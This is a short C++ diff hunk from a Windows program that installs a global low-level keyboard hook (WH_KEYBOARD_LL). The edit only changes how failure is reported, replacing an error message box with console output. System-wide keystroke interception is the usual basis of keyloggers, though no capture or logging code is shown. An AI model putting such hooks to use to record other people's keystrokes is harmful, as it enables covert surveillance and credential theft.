@@ -85,9 +85,8 @@ void SetHook()
 	// function that sets and releases the hook.
 	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
 	{
-		LPCWSTR a = L"Failed to install hook!";
-		LPCWSTR b = L"Error";
-		MessageBox(NULL, a, b, MB_ICONERROR);
+		cout << "failed";
+		
 	}
 }
 
